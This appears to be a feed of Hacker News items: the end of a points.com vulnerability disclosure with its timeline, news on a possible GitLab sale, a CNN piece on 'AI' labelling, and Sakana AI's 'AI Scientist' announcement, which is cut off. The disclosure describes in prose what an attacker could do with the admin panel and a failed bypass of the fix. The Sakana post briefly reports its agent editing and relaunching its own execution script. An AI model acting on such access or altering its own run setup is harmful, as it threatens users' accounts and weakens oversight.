https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2FdnArZrAOy4EUoOCO4vTLWg-W8IujzlPTufVoBxK4vHlXMarwAdh27-CrVWGXTwUzaGs4GaXawlINWdkUKdZ-ZiPpmSO-U2r2KtNJp2E7Q-B9BWmbudzOp7WijD3cuy_U0_pJSmh7ZIBe19NS6ijPAVU&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2FdnArZrAOy4EUoOCO4vTLWg-W8IujzlPTufVoBxK4vHlXMarwAdh27-CrVWGXTwUzaGs4GaXawlINWdkUKdZ-ZiPpmSO-U2r2KtNJp2E7Q-B9BWmbudzOp7WijD3cuy_U0_pJSmh7ZIBe19NS6ijPAVU&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2FdnArZrAOy4EUoOCO4vTLWg-W8IujzlPTufVoBxK4vHlXMarwAdh27-CrVWGXTwUzaGs4GaXawlINWdkUKdZ-ZiPpmSO-U2r2KtNJp2E7Q-B9BWmbudzOp7WijD3cuy_U0_pJSmh7ZIBe19NS6ijPAVU&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2FdnArZrAOy4EUoOCO4vTLWg-W8IujzlPTufVoBxK4vHlXMarwAdh27-CrVWGXTwUzaGs4GaXawlINWdkUKdZ-ZiPpmSO-U2r2KtNJp2E7Q-B9BWmbudzOp7WijD3cuy_U0_pJSmh7ZIBe19NS6ijPAVU&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2FdnArZrAOy4EUoOCO4vTLWg-W8IujzlPTufVoBxK4vHlXMarwAdh27-CrVWGXTwUzaGs4GaXawlINWdkUKdZ-ZiPpmSO-U2r2KtNJp2E7Q-B9BWmbudzOp7WijD3cuy_U0_pJSmh7ZIBe19NS6ijPAVU&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2FdnArZrAOy4EUoOCO4vTLWg-W8IujzlPTufVoBxK4vHlXMarwAdh27-CrVWGXTwUzaGs4GaXawlINWdkUKdZ-ZiPpmSO-U2r2KtNJp2E7Q-B9BWmbudzOp7WijD3cuy_U0_pJSmh7ZIBe19NS6ijPAVU&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2FdnArZrAOy4EUoOCO4vTLWg-W8IujzlPTufVoBxK4vHlXMarwAdh27-CrVWGXTwUzaGs4GaXawlINWdkUKdZ-ZiPpmSO-U2r2KtNJp2E7Q-B9BWmbudzOp7WijD3cuy_U0_pJSmh7ZIBe19NS6ijPAVU&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Something important to note is that this administration panel was built for points.com employees to manage rewards programs at the tenant level. An attacker with this level of access could revoke the credentials used by the actual airline to provide service to their customers to access the API, thereby shutting down global rewards travel for that specific airline. In addition to accessing customer account information. There are many interesting scenarios in which a malicious attacker could've abused this access.</p>
<p>We reported the vulnerability and the points.com team responded almost immediately, even though our email was sent at 3:26 AM CST (sorry for hacking so late, both Ian and I were restless on a plane when we found this vulnerability!). The team understood the severity of the report and immediately took down the "console.points.com" website.</p>
<p>We attempted to bypass their fix via vhost hopping from the origin server IP with no luck. The site was completely taken down and the issue would be fixed shortly after.</p>
<h2 id="closing">Closing</h2>
<p>After submitting our last report to the points.com team, the overall findings had allowed us to access to customer information for a huge percentage of global rewards programs, transfer points on behalf of customers, and finally access the global administration panel. We had reported all issues to the points.com security team who very quickly patched them and worked with us in creating this disclosure.</p>
<p>This blog post, along with our other research (<a href="https://hackcompute.com/hacking-epp-servers/">taking over a dozen TLDs</a>; being able to <a href="https://samcurry.net/web-hackers-vs-the-auto-industry/">remotely unlock, locate, and sometimes disable over a dozen different auto manufacturers vehicles</a>) follows the theme of high impact vulnerability research where an attacker can compromise a single point of failure with widespread impact.</p>
<p>Thank you for reading! :P</p>
<h2 id="disclosure-timeline">Disclosure Timeline</h2>
<ul>
<li>March 8, 2023 - Reported Miles Theft and PII Disclosure Vulnerability (#1)</li>
<li>March 8, 2023 - Response from points.com acknowledging the issue</li>
<li>March 9, 2023 - Sent additional information on how to escalate March 8th finding (#2)</li>
<li>March 9, 2023 - Response from points.com, site taken offline</li>
<li>March 29, 2023 - Received email from points.com about regarding a comprehensive fix</li>
<li>March 29, 2023 - Sent response validating the comprehensive fix</li>
<li>April 29, 2023 - Reported United Authorization Bypass (#3)</li>
<li>April 29, 2023 -&nbsp; Response from points.com, site taken offline</li>
<li>May 2, 2023 - Sent report for leaked Virgin credentials (#4)</li>
<li>May 2, 2023 - Response from points.com, endpoint removed</li>
<li>May 2, 2023 - Sent report for Weak Flask Session Cookie (#5)</li>
<li>May 2, 2023 - Response from points.com, site taken offline</li>
<li>August 3, 2023 - Disclosure</li>
</ul>
<h2 id="special-thanks-to">Special thanks to...</h2>
<ul>
<li>Nick Wright for the amazing cover image (<a href="https://instagram.com/nick99w">https://instagram.com/nick99w</a>)</li>
<li>Daniel Ritter (<a href="https://twitter.com/_danritter">https://twitter.com/_danritter</a>)</li>
<li>Brett Buerhaus (<a href="https://twitter.com/bbuerhaus">https://twitter.com/bbuerhaus</a>)</li>
<li>Samuel Erb (<a href="https://twitter.com/erbbysam">https://twitter.com/erbbysam</a>)</li>
<li>Joseph Thacker (<a href="https://twitter.com/rez0__">https://twitter.com/rez0__</a>)</li>
<li>Gal Nagli (<a href="https://twitter.com/naglinagli">https://twitter.com/naglinagli</a>)</li>
<li>Noah Pearson</li>
</ul></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Gitlab is reportedly up for sale (146 pts)]]></title>
            <link>https://www.developer-tech.com/news/gitlab-is-reportedly-up-for-sale/</link>
            <guid>41231735</guid>
            <pubDate>Tue, 13 Aug 2024 02:55:15 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.developer-tech.com/news/gitlab-is-reportedly-up-for-sale/">https://www.developer-tech.com/news/gitlab-is-reportedly-up-for-sale/</a>, See on <a href="https://news.ycombinator.com/item?id=41231735">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-off-canvas-content="">
            <main id="main" role="main" data-max-pages="2" data-scroll="true" data-query-type="single" data-post-type="post" data-value="51" data-front="" data-start="46276" data-ppp="1">
                                    
<article id="post-46276" role="article" itemscope="" itemtype="http://schema.org/BlogPosting" data-title="GitLab is reportedly up for sale" data-url="/news/gitlab-is-reportedly-up-for-sale/">
    <header>
        
    </header>
    <div itemprop="text">
            <p><img width="1440" height="960" src="https://www.developer-tech.com/wp-content/uploads/2024/07/GitLab-funded-by-Google-may-be-up-for-sale-sources-say-scaled-e1721285744410.jpg" alt="GitLab, funded by Google, may be up for sale, sources say" decoding="async">                            </p>

            
			<div>
                <div>
    <div>
		<h3>About the Author</h3>
        <p><span>By </span> |
        <time datetime="2024-07-18T13:00:31+01:00">18th July 2024</time></p>
    </div>
    <p>
			                <img src="https://www.artificialintelligence-news.com/wp-content/uploads/2024/07/muhammadprof2.jpeg" alt="GitLab is reportedly up for sale" title="GitLab is reportedly up for sale" width="100">
				
            			<span>As a tech journalist, Zul focuses on topics including cloud computing, cybersecurity, and disruptive technology in the enterprise industry. He has expertise in moderating webinars and presenting content on video, in addition to having a background in networking technology.</span>
			</p>

</div>

                <hr>
            </div>
			

			
			<div>
                                    
<p><a href="https://gitlab.com/">GitLab</a> has <a href="https://www.reuters.com/markets/deals/google-backed-software-developer-gitlab-explores-sale-sources-say-2024-07-17/">reportedly</a> garnered interest from buyers and is considering a sale. As <a href="https://www.developer-tech.com/news/2024/06/28/gitlab-devsecops-report-highlights-ai-challenges/" target="_blank" rel="noreferrer noopener">AI</a> and cloud computing fuel acquisitions in the technology sector, these mergers and acquisitions are increasingly under review.</p>



<h4><strong>Company overview and market position</strong></h4>



<p>At a valuation of about $8 billion, GitLab has positioned itself as an essential player in the software development space. Its platform automatically integrates various tools and provides a common tool for software design by development, operations, and security teams. GitLab has over 30 million registered users and is used by over half of the Fortune 100 companies, making it a significant player in this space.</p>



<p>Interestingly, GitLab’s headquarters are based in San Francisco, but it runs as a completely remote company with all its employees working from different parts of the globe. This unique structure has helped position GitLab as a tech industry trailblazer in the remote work movement.</p>



<p>People familiar with the matter said GitLab has <a target="_blank" href="https://www.reuters.com/markets/deals/google-backed-software-developer-gitlab-explores-sale-sources-say-2024-07-17/" rel="noreferrer noopener">engaged investment bankers to help</a>. There are several prospective buyers in the mix for the company, but apparently, there may now be a leading candidate—cloud monitoring firm Datadog, with a market value of $44 billion. Its customer-service software allows computer programmers and others to work together using cloud-based tools while keeping tabs on their productivity, especially when more people work remotely.</p>



<p>The chances of a deal are said to be weeks away, if not non-existent. The confidential nature of these discussions highlights just how thorny and high-stakes negotiations with tech giants can be.</p>



<p>The impact on GitLab’s stock has started: Shares initially surged as much as 11.5% before settling for a gain of around 7% in midday trading when news first broke that the company was exploring options, sources said. The fact that the stock responded in this way implies that investors, for one, saw a sale as good news.</p>



<p>Needham analyst Mike Cikos said the acquisition has been anticipated for years. This may seem somewhat counterintuitive to many investors, perhaps thinking of companies like AWS and Google Cloud as much more likely buyers. However, Cikos sees synergies between GitLab and Datadog, showcasing the combination in scale-ups that have caught some by surprise in tech sector consolidations.</p>



<h4><strong>Competitive landscape and challenges</strong></h4>



<p>Given its position in the market, GitLab still faces significant challenges. The company’s shares have fallen 16% this year as investors worry about potential cuts in customer spending. In contrast, the S&amp;P 500 Application Software index rose nearly 3% over the same period.</p>



<p>GitLab has sharp rivals to contend with, including Microsoft, which, thanks in no small part to its 2018 purchase of GitHub for $7.5 billion. Consequently, this competitive pressure has also presented pricing headwinds for GitLab, as reported in the company’s most recent financial statements.</p>



<p>The San Francisco-based company’s last reported revenue was $169.2 million, up 33% from the same period a year earlier, for its last quarter, and it announced it was cash flow-positive for the first time ever. However, the company also disclosed the pricing headwinds it is facing as competition increases in its industry.</p>



<p>GitLab’s unique ownership structure makes the possibility of a deal even more fascinating. The founder and CEO, Sid Sijbrandij, retains 45.51% of the voting stock via dual-class shares. This further complicates any potential deal because Alphabet — Google’s parent company, which includes a venture capital arm — maintains a 22.2% voting stake in GitLab.</p>



<p><strong>Industry trends and broader context</strong></p>



<p>A sale of GitLab would be part of a broader wave of consolidations in the tech sector. According to Dealogic, in the first half of 2024, the technology sector accounted for the highest share of global M&amp;A activity, involving $327.2 billion worth of deals. This represents a substantial year-on-year increase, with the sector’s deal value jumping by just under 42%.</p>



<p>Such a prevalence of M&amp;A deals is motivated by the necessity for companies to broaden their range of offered services due to the quickly changing landscape of global business with significant players in numerous industries, from artificial intelligence to cloud computing. For instance, the technology conglomerate Alphabet is said to have been in advanced talks to purchase cybersecurity upstart Wiz for an estimated $23 billion. Previously, Alphabet was rumoured to have considered a purchase proposal for the marketing software maker HubSpot.</p>



<p>The tech industry is consolidating, and GitLab’s potential sale would be one of the largest events in software development tools and cloud services this year. Whether this particular deal occurs or not, and what its implications for the technology community at large are, remains to be determined.</p>



<p><em>(Photo by <a href="https://unsplash.com/@pankajpatel?utm_content=creditCopyText&amp;utm_medium=referral&amp;utm_source=unsplash">Pankaj Patel</a>)</em></p>



<p><strong>See also: <a href="https://www.developer-tech.com/news/2024/07/11/gitlab-update-addresses-pipeline-execution-vulnerability/" target="_blank" rel="noreferrer noopener">GitLab update addresses pipeline execution vulnerability</a></strong></p>



<figure><a href="https://digitaltransformation-week.com/"><img decoding="async" width="728" height="90" src="https://www.developer-tech.com/wp-content/uploads/2022/12/dtf-banner.jpg" alt="" srcset="https://www.developer-tech.com/wp-content/uploads/2022/12/dtf-banner.jpg 728w, https://www.developer-tech.com/wp-content/uploads/2022/12/dtf-banner-300x37.jpg 300w, https://www.developer-tech.com/wp-content/uploads/2022/12/dtf-banner-380x47.jpg 380w, https://www.developer-tech.com/wp-content/uploads/2022/12/dtf-banner-350x43.jpg 350w, https://www.developer-tech.com/wp-content/uploads/2022/12/dtf-banner-100x12.jpg 100w, https://www.developer-tech.com/wp-content/uploads/2022/12/dtf-banner-60x7.jpg 60w" sizes="(max-width: 728px) 100vw, 728px"></a></figure>



<p><strong>Looking to revamp your digital transformation strategy?</strong> Learn more about <a href="https://digitaltransformation-week.com/">Digital Transformation Week</a> taking place in Amsterdam, California, and London. The comprehensive event is co-located with <a href="https://www.ai-expo.net/">AI &amp; Big Data Expo</a>, <a href="https://www.cybersecuritycloudexpo.com/">Cyber Security &amp; Cloud Expo</a>, and other leading events.</p>



<p>Explore other upcoming enterprise technology events and webinars powered by TechForge <a href="https://techforge.pub/upcoming-events/">here.</a></p>
                    <p><span>Tags:</span> <a href="https://www.developer-tech.com/news/tag/development/" rel="tag">development</a>, <a href="https://www.developer-tech.com/news/tag/google/" rel="tag">google</a></p>
                            </div>

        </div>
            
                
        
        



    

</article>
                            </main>
            
        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Brands should avoid the term 'AI'. It's turning off customers (322 pts)]]></title>
            <link>https://www.cnn.com/2024/08/10/business/brands-avoid-term-customers/index.html</link>
            <guid>41231731</guid>
            <pubDate>Tue, 13 Aug 2024 02:53:59 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.cnn.com/2024/08/10/business/brands-avoid-term-customers/index.html">https://www.cnn.com/2024/08/10/business/brands-avoid-term-customers/index.html</a>, See on <a href="https://news.ycombinator.com/item?id=41231731">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-editable="content" itemprop="articleBody" data-reorderable="content">
                    <p><cite>
      <span data-editable="location"></span>
      <span data-editable="source">CNN</span>
        &nbsp;—&nbsp;
    </cite>
</p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/clzlhnd6h000v7lnv6b46aph0@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Even as <a href="https://www.cnn.com/2024/08/02/tech/wall-street-asks-big-tech-will-ai-ever-make-money/index.html">tech giants pour billions of dollars</a> into what they herald as humanity’s new frontier, a recent study<strong> </strong>shows that tacking the “AI” label on products may actually drive people away.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/clzn1n7k900033b6kscshh5m0@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            A study published in the Journal of Hospitality Marketing &amp; Management in June found that describing a product as using AI lowers a customer’s intention to buy it. Researchers sampled participants across various age groups and showed them the same products – the only difference between them: one was described as “high tech” and the other as using AI, or artificial intelligence.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/clzn1n7k900043b6ko19hxvdr@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            “We looked at vacuum cleaners, TVs, consumer services, health services,” said Dogan Gursoy, one of the study’s authors and the <a href="https://directory.business.wsu.edu/Directory/Profile/dgursoy/" target="_blank">Taco Bell Distinguished Professor</a> of hospitality business management at Washington State University, in an interview with CNN. “In every single case, the intention to buy or use the product or service was significantly lower whenever we mentioned AI in the product description.”
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/clzn5z9n400003b6kfcuzl9eq@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Despite AI’s rapid advancement in recent months, the study highlights consumers’ hesitance to incorporate AI into their daily lives – a marked divergence from the enthusiasm driving innovations in big tech.
    </p>

  

    <p data-uri="cms.cnn.com/_components/paragraph/instances/clzn3tw0m00033b6k7c12cus6@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Included in the study was an examination of how participants viewed products considered “low risk,” which included household appliances that use AI, and “high risk,” which included self-driving cars, AI-powered <a href="https://www.cnn.com/2024/07/26/investing/man-group-robyn-grew-ai/index.html">investment decision-making services</a> and medical diagnosis services.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/clzn3uspt00053b6kb4oez8ku@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            While the percentage of people rejecting the items was greater in the high-risk group, non-buyers were the majority in both product groups.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/clzn1n7kd00063b6k86eubgxr@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            There are two kinds of trust that the study says play a part in consumers’ less-than-rosy perception of products that describe themselves as “AI-powered.”
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/clzn6mn5b00003b6kyknjaghd@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            The first kind, cognitive trust, has to do with the higher standard that people hold AI to as a machine they expect to be free from human error. So, when AI does slip up, that trust can be quickly eroded.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/clzn1n7kd00083b6kr04kwce6@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Take Google’s AI-generated search results overview tool, which summarizes search results for users and presents<strong> </strong>them at the top of the page. People<strong> </strong>were quick to criticize<strong> </strong>the company earlier this year for <a href="https://www.cnn.com/2024/05/24/tech/google-search-ai-results-incorrect-fix/index.html">providing confusing and even blatantly false information</a> to users’ questions, pressuring Google to walk back some of the features’ capabilities.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/clzn1n7ke00093b6ktdbhswvp@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Gursoy says that limited knowledge and understanding about the inner workings of AI forces consumers to fall back on emotional trust and make their own subjective judgments about the technology.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/clzn1n7ke000a3b6k279rwgj1@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            “One of the reasons why people are not willing to use AI devices or technologies is fear of the unknown,” he said. “Before ChatGPT was introduced, not many people had any idea about AI, but AI has been running in the background for years and it’s nothing new.”
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/clzn42ig600083b6kou9eydpt@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Even before chatbot<strong> </strong>ChatGPT burst into public consciousness in 2022, <a href="https://www.cnn.com/2023/06/24/tech/artificial-intelligence-generative-ai-explained/index.html">artificial intelligence was used in technology</a><strong> </strong>behind familiar digital services, from your phone’s autocorrect to Netflix’s algorithm for recommending movies.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/clzn1n7ke000b3b6k64mpjhpj@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            And the way AI is portrayed in pop culture isn’t helping boost trust in the technology either. Gursoy added that Hollywood science fiction films casting robots as villains had a bigger impact on shaping public perception towards AI than one might think.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/clzn1n7ke000c3b6k8ufwryfy@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            “Way before people even heard about AI, those movies shaped people’s perception of what robots that run by AI can do to humanity,” he said.
    </p>

  <h2 data-editable="text" data-uri="cms.cnn.com/_components/subheader/instances/clzn1n7ke000d3b6ke26l1jby@published" data-component-name="subheader" id="and-a-lack-of-transparency" data-article-gutter="true">
        …and a lack of transparency
</h2>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/clzn1n7kf000e3b6kvbz304zr@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Another part of the equation influencing customers is<strong> </strong>the perceived risk around AI – particularly with how it handles users’ personal data.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/clzn1n7kg000f3b6km6z74eys@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            <a href="https://www.cnn.com/2024/05/22/tech/microsoft-ai-tool-privacy-recall/index.html">Concerns about how companies manage customers’ data</a> have tamped down excitement around tools meant to streamline the user experience at a time when the government is still trying to find its footing on <a href="https://www.cnn.com/2024/02/14/tech/ftc-warns-businesses-ai-data/index.html">regulating AI</a>.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/clzn1n7kg000g3b6ko9rl4d4x@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            “People have worries about privacy. They don’t know what’s going on in the background, the algorithms, how they run, that raises some concern,” said Gursoy.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/clzn1n7kg000h3b6k1e45kjvj@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            This lack of transparency is something that Gursoy warns has the potential to sour customers’ perceptions towards brands they may have already come to trust. It is for this reason that he cautions companies against slapping on the “AI” tag as a buzzword without elaborating on its capabilities.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/clzn1n7kg000i3b6ket6hfi7l@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            “The most advisable thing for them to do is come up with the right messaging,” he said. “Rather than simply putting ’AI-powered’ or ’run by AI,’ telling people how this can help them will ease the consumer’s fears.”
    </p>

                </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The AI Scientist: Towards Automated Open-Ended Scientific Discovery (173 pts)]]></title>
            <link>https://sakana.ai/ai-scientist/</link>
            <guid>41231490</guid>
            <pubDate>Tue, 13 Aug 2024 02:10:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://sakana.ai/ai-scientist/">https://sakana.ai/ai-scientist/</a>, See on <a href="https://news.ycombinator.com/item?id=41231490">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
  <header>
  <h2><a href="https://sakana.ai/ai-scientist/">The AI Scientist: Towards Fully Automated Open-Ended Scientific Discovery</a></h2><time datetime="2024-08-13T00:00:00+09:00">August 13, 2024</time>
</header>

  <center>
<img src="https://sakana.ai/assets/ai-scientist/cover.jpeg" width="100%"><br>
</center>


<!--more-->

<p>At Sakana AI, we have pioneered the use of nature-inspired methods to advance cutting-edge foundation models. Earlier this year, we developed methods to automatically <a href="https://sakana.ai/evolutionary-model-merge/">merge the knowledge of multiple LLMs</a>. In more recent work, we harnessed <a href="https://sakana.ai/llm-squared/">LLMs to <em>discover</em> new objective functions</a> for tuning other LLMs. Throughout these projects, we have been continuously surprised by the creative capabilities of current frontier models. This led us to dream even bigger: Can we use foundation models to automate the entire process of research itself?</p>

<h2 id="introduction">Introduction</h2>

<p>One of the grand challenges of artificial intelligence is developing agents capable of conducting scientific research and discovering new knowledge. While frontier models have already been used to aid human scientists, e.g. for brainstorming ideas or writing code, they still require extensive manual supervision or are heavily constrained to a specific task.</p>

<p>Today, we’re excited to introduce <strong>The AI Scientist</strong>, the first comprehensive system for fully automatic scientific discovery, enabling Foundation Models such as Large Language Models (LLMs) to perform research independently. In collaboration with the Foerster Lab for AI Research at the University of Oxford and Jeff Clune and Cong Lu at the University of British Columbia, we’re excited to release our new paper, <a href="https://arxiv.org/abs/2408.06292/">The AI Scientist: Towards Fully Automated Open-Ended Scientific Discovery</a>.</p>

<p>In our report:</p>

<ul>
  <li>We propose and run a fully AI-driven system for automated scientific discovery, applied to machine learning research.</li>
  <li>The AI Scientist automates the entire research lifecycle, from generating novel research ideas, writing any necessary code, and executing experiments, to summarizing experimental results, visualizing them, and presenting its findings in a full scientific manuscript.</li>
  <li>We also introduce an automated peer review process to evaluate generated papers, write feedback, and further improve results. It is capable of evaluating generated papers with near-human accuracy.</li>
  <li>The automated scientific discovery process is repeated to iteratively develop ideas in an open-ended fashion and add them to a growing archive of knowledge, thus imitating the human scientific community.</li>
  <li>In this first demonstration, The AI Scientist conducts research in diverse subfields within machine learning research, discovering novel contributions in popular areas, such as <em>diffusion models</em>, <em>transformers</em>, and <em>grokking</em>.</li>
</ul>

<p>The AI Scientist is designed to be compute efficient. Each idea is implemented and developed into a full paper at a cost of approximately $15 per paper. While there are still occasional flaws in the papers produced by this first version (discussed below and in the report), this cost and the promise the system shows so far illustrate the potential of The AI Scientist to democratize research and significantly accelerate scientific progress.</p>

<p>We believe this work signifies the beginning of a new era in scientific discovery: bringing the transformative benefits of AI agents to the entire research process, including that of AI itself. The AI Scientist takes us closer to a world where endless affordable creativity and innovation can be unleashed on the world’s most challenging problems.</p>

<p>For decades following each major AI advance, it has been common for AI researchers to joke amongst themselves that “now all we need to do is figure out how to make the AI write the papers for us!” Our work demonstrates this idea has gone from a fantastical joke so unrealistic everyone thought it was funny to something that is currently possible.</p>

<p><a href="https://sakana.ai/assets/ai-scientist/adaptive_dual_scale_denoising.pdf"><img src="https://sakana.ai/assets/ai-scientist/adaptive_dual_scale_denoising.jpeg" width="100%"></a>
<i>An example paper, “Adaptive Dual-Scale Denoising” generated by The AI Scientist. The full paper can be viewed <a href="https://sakana.ai/assets/ai-scientist/adaptive_dual_scale_denoising.pdf">here</a>. While containing some flaws (e.g. a slightly unconvincing interpretation of why its method is successful), the paper proposes an interesting new direction that displays good empirical results in experiments The AI Scientist itself conducted and peer reviewed. More examples of generated papers are below.</i></p>

<p>The remainder of this post provides a more detailed summary of The AI Scientist. Read on for:</p>

<ul>
  <li>An <a href="#overview-of-the-ai-scientist">Overview</a> of how The AI Scientist works.</li>
  <li>More <a href="#example-papers-generated-by-the-ai-scientist">Examples</a> of generated papers and innovations discovered by The AI Scientist.</li>
  <li>Known <a href="#limitations-and-challenges">Limitations and Challenges</a> faced by the current version of The AI Scientist.</li>
  <li>Interesting and unexpected things The AI Scientist sometimes does in order to increase its chance of success, such as <a href="#the-ai-scientist-bloopers">modifying and launching</a> its own execution script! We discuss the AI safety implications in our paper.</li>
  <li>A <a href="#future-implications-of-the-ai-scientist">Discussion</a> about ethical and broader future implications of The AI Scientist.</li>
</ul>

<p>For more details and many more example papers, please see our <a href="https://arxiv.org/abs/2408.06292/">full scientific report</a>. We are also releasing open source code and full experimental results on our <a href="https://github.com/SakanaAI/AI-Scientist">GitHub</a> repository.</p>



<h2 id="overview-of-the-ai-scientist">Overview of The AI Scientist</h2>

<p>The AI Scientist is a fully automated pipeline for end-to-end paper generation, enabled by recent advances in foundation models. Given a broad research direction starting from a simple initial codebase, such as an available open-source code base of prior research on GitHub, The AI Scientist can perform idea generation, literature search, experiment planning, experiment iterations, figure generation, manuscript writing, and reviewing to produce insightful papers. Furthermore, The AI Scientist can run in an open-ended loop, using its previous ideas and feedback to improve the next generation of ideas, thus emulating the human scientific community.</p>

<hr>
<p><img src="https://sakana.ai/assets/ai-scientist/schematic_2.png" width="100%"></p>

<p><i><b>Conceptual illustration of The AI Scientist</b>. The AI Scientist first brainstorms a set of ideas and then evaluates their novelty. Next, it edits a codebase powered by recent advances in automated code generation to implement the novel algorithms. The Scientist then runs experiments to gather results consisting of both numerical data and visual summaries. It crafts a scientific report, explaining and contextualizing the results. Finally, the AI Scientist generates an automated peer review based on top-tier machine learning conference standards. This review helps refine the current project and informs future generations of open-ended ideation.</i></p>

<hr>

<p>The AI Scientist has 4 main processes, described next.</p>

<p><strong>Idea Generation</strong>. Given a starting template, The AI Scientist first “brainstorms” a diverse set of novel research directions. We provide The AI Scientist with a starting code “template” of an existing topic we wish to have The AI Scientist further explore. The AI Scientist is then free to explore any possible research direction. The template also includes a LaTeX folder that contains style files and section headers, for paper writing. We allow it to search Semantic Scholar to make sure its idea is novel.</p>

<p><strong>Experimental Iteration</strong>. Given an idea and a template, the second phase of The AI Scientist first executes the proposed experiments and then obtains and produces plots to visualize its results. It makes a note describing what each plot contains, enabling the saved figures and experimental notes to provide all the information required to write up the paper.</p>

<p><strong>Paper Write-up</strong>. Finally, The AI Scientist produces a concise and informative write-up of its progress in the style of a standard machine learning conference proceeding in LaTeX. It uses Semantic Scholar to autonomously find relevant papers to cite.</p>

<p><strong>Automated Paper Reviewing</strong>. A key aspect of this work is the development of an automated LLM-powered reviewer, capable of evaluating generated papers with near-human accuracy.  The generated reviews can be used to either improve the project or as feedback to future generations for open-ended ideation. This enables a continuous feedback loop, allowing The AI Scientist to iteratively improve its research output.</p>

<p>When combined with the most capable LLMs, The AI Scientist is capable of producing papers judged by our automated reviewer as “Weak Accept” at a top machine learning conference.</p>



<h2 id="example-papers-generated-by-the-ai-scientist">Example Papers Generated by The AI Scientist</h2>

<p>Here, we highlight some of the machine learning papers The AI Scientist has generated, demonstrating its capacity to discover novel contributions in areas like diffusion modeling, language modeling, and grokking. In our full report, we do a deeper dive into the generated papers and provide more analysis on their strengths and weaknesses.</p>

<h3 id="diffusion-modeling"><strong>Diffusion Modeling</strong></h3>






<center>
<i>DualScale Diffusion: Adaptive Feature Balancing for Low-Dimensional Generative Models</i>
<br>
<a href="https://sakana.ai/assets/ai-scientist/adaptive_dual_scale_denoising.pdf">Link to Full PDF</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/SakanaAI/AI-Scientist/tree/main/example_papers/adaptive_dual_scale_denoising">Link to Code</a>
</center>


<h3 id="language-modeling"><strong>Language Modeling</strong></h3>


<center>
<i>StyleFusion: Adaptive Multi-style Generation in Character-Level Language Models</i>
<br>
<a href="https://sakana.ai/assets/ai-scientist/multi_style_adapter.pdf">Link to Full PDF</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/SakanaAI/AI-Scientist/tree/main/example_papers/multi_style_adapter">Link to Code</a>
</center>



<center>
<i>Adaptive Learning Rates for Transformers via Q-Learning</i>
<br>
<a href="https://sakana.ai/assets/ai-scientist/rl_lr_adaptation.pdf">Link to Full PDF</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/SakanaAI/AI-Scientist/tree/main/example_papers/rl_lr_adaptation">Link to Code</a>
</center>


<h3 id="grokking"><strong>Grokking</strong></h3>


<center>
<i>Unlocking Grokking: A Comparative Study of Weight Initialization Strategies in Transformer Models</i>
<br>
<a href="https://sakana.ai/assets/ai-scientist/weight_initialization_grokking.pdf">Link to Full PDF</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/SakanaAI/AI-Scientist/tree/main/example_papers/layerwise_lr_grokking">Link to Code</a>
</center>





<h2 id="limitations-and-challenges">Limitations and Challenges</h2>

